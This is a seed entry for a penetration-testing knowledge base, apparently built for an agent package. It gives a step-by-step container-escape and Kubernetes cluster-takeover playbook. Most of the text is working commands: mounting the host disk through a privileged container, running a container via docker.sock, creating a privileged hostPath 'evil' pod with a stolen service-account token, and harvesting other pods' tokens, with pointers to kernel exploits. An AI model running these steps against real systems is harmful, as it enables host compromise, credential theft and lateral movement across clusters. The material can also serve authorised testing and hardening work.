# [Seed] Container Escape → Root on the Host (cap_sys_admin / privileged container / docker.sock)

## Scenario Category
Pentest / Cloud Native / Container Security

## Target Overview
You get a shell inside a container (via an application vulnerability / an exposed Jenkins / or RCE on K8s) and need to escape from the container to the host, then move laterally to take over the entire K8s cluster.

## Full Execution Chain

1. Recon immediately after landing in the container
   ```bash
   id                                    # root or not?
   cat /proc/self/status | grep CapEff   # check capabilities
   capsh --print                         # same, more readable
   ls -la /var/run/docker.sock           # is the Docker socket mounted?
   mount | grep -v proc                  # see which host directories are mounted
   cat /proc/1/cgroup                    # docker / containerd / kubepods?
   env | grep -i 'kube\|docker\|aws\|az' # service account / metadata token
   ls /var/run/secrets/kubernetes.io/serviceaccount/  # K8s SA token
   ```
2. Pick an escape path based on the findings:

   **Path A: privileged container (`--privileged`)**
   ```bash
   # Directly mount the host disk
   mkdir /host && mount /dev/sda1 /host
   chroot /host
   # You are now root on the host
   ```

   **Path B: cap_sys_admin / cap_dac_read_search**
   ```bash
   # release_agent bypass (CVE-2022-0492 family)
   # use cap_sys_admin to mount directly
   ```

   **Path C: docker.sock is mounted**
   ```bash
   docker -H unix:///var/run/docker.sock run -v /:/host alpine chroot /host bash
   ```

   **Path D: K8s SA token has usable permissions**
   ```bash
   TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
   kubectl --token=$TOKEN auth can-i --list
   # if you can create pods → launch a privileged pod with hostPID/hostNetwork/hostPath to escape
   ```

   **Path E: kernel exploit (Dirty Pipe / Dirty COW / OverlayFS)**
   ```bash
   uname -a               # check the kernel version
   # pick a ready-made exploit for the matching CVE
   ```

3. Once out, look for the next hop on the host
   - kubelet credentials (/var/lib/kubelet)
   - container runtime socket (containerd / dockerd)
   - other pods' tokens
   - hostNetwork → direct access to every service IP in the cluster
4. Spread laterally across the whole K8s cluster

## Pitfalls Log

| Problem | Cause | Solution | Time |
|------|------|---------|------|
| Container is non-root with empty capabilities | Application layer is well hardened | Look for setuid binaries / kernel vulnerabilities / container-external vulnerabilities | several hours |
| docker.sock is visible but not readable | Socket is root:root 660 | Join the current uid to the docker group (if there is a setgid program) or abuse other containers | 30min |
| Privileged pod created but image pull fails | Internal cluster, internal docker registry | Use an image already present in the cluster (any one under kube-system) | 20min |
| K8s SA token has no permissions | The default SA is usually default/restricted | Try list pods → find a pod with cluster-admin → steal its SA token | 1h |
| No common tools after chroot | Host is a minimal distro | mount /proc /dev /sys before chroot; or operate on /host directly from the original namespace | 30min |
| Cluster enforces Pod Security Standards | The restricted policy blocks hostPath / privileged | Check whether any namespace has a laxer admission configuration; find an SA with deployment-creation rights | several hours |

## Toolchain Findings

- **deepce** automated container escape checking (a single sh script, no dependencies)
- **kdigger** Kubernetes/container recon tool with structured output
- **peirates** K8s pentest TUI
- **kube-hunter** from Aqua, scans clusters for security issues
- **botb (break out the box)** classic container escape tool
- **cdk** container pentest Swiss-army knife (Chinese-language project, covers Chinese cloud provider scenarios)

## Key Code/Commands

One-shot self-check:

```bash
# Pull deepce (no dependencies at all)
wget https://github.com/stealthcopter/deepce/raw/main/deepce.sh
chmod +x deepce.sh
./deepce.sh
# Output: detected N escape paths
```

Use the K8s SA token to launch a privileged pod and escape:

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc

# Check permissions
curl -sk --header "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -X POST -d '{"spec":{"namespace":"default"}}'

# If you can create pods, mount the host with hostPath
cat <<EOF > evil-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: evil
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: evil
    image: alpine
    command: ["/bin/sh","-c","sleep 999999"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host
  volumes:
  - name: host
    hostPath:
      path: /
EOF

curl -sk --header "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/yaml" \
  -X POST $APISERVER/api/v1/namespaces/default/pods \
  --data-binary @evil-pod.yaml

# Then exec into the evil pod and chroot /host
```

CVE-2022-0492 exploitation (cap_sys_admin + without a user namespace):

```bash
# See https://github.com/PaloAltoNetworks/cve-2022-0492
# Core: mount a cgroup → write release_agent → trigger it on an empty cgroup → executes in host context
```

## Improvement Suggestions for This Package

- `CTF-Sandbox-Orchestrator/competition-agent-cloud/` already exists; consider adding `references/k8s-attack-paths.md`
- Add a complete "container escape → cluster takeover" path example to attack-chain
- Add deepce / kdigger / peirates to bootstrap-manifest

## Reusable Patterns/Script Snippets

**Container escape 5-path quick reference**:

```text
1. privileged container → mount /dev/sda1 /host && chroot /host
2. cap_sys_admin        → CVE-2022-0492 (release_agent) / mount a cgroup yourself
3. docker.sock          → docker run -v /:/host alpine chroot /host
4. K8s SA + rights      → launch a hostPath/privileged pod
5. kernel CVE           → DirtyPipe (CVE-2022-0847) / DirtyCred (CVE-2022-2588) / OverlayFS (CVE-2023-0386)
```

**Must-check once out**:

```text
- /var/lib/kubelet/pods/        → steal other pods' SA tokens
- /var/lib/docker/              → list the running containers
- ip addr                        → reach service IPs directly via hostNetwork
- crictl ps                      → containerd container list
- ps -ef --forest                → find kubelet / dockerd launch parameters (may contain tokens)
```

## Evolution Actions
- [ ] Add k8s-attack-paths.md to CTF-Sandbox-Orchestrator/competition-agent-cloud
- [ ] Add a container escape → cluster takeover path to attack-chain
- [ ] Add deepce/kdigger/peirates to bootstrap-manifest

## Environment Info
- Attack position: inside a container (any shell entry point works)
- Target: K8s 1.24+ / Docker 20+ / containerd 1.6+
- Kernel: depends on the target; watch the time windows for CVE-2022-0492 / CVE-2022-0847 / CVE-2023-0386

## Sanitization Requirement
This entry is seed data, written from public container/K8s security research; it involves no real cluster.
